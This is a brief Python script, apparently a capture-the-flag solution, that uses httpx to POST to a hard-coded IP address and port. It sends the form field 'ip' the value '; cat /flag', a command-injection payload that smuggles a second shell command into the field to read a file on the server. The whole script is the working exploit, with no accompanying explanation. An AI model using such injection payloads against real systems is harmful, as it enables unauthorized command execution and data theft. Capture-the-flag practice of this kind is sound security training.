import httpx

resp = httpx.post('http://129.204.78.34:20461/', data={
    'ip': '; cat /flag'
})

print(resp.text)
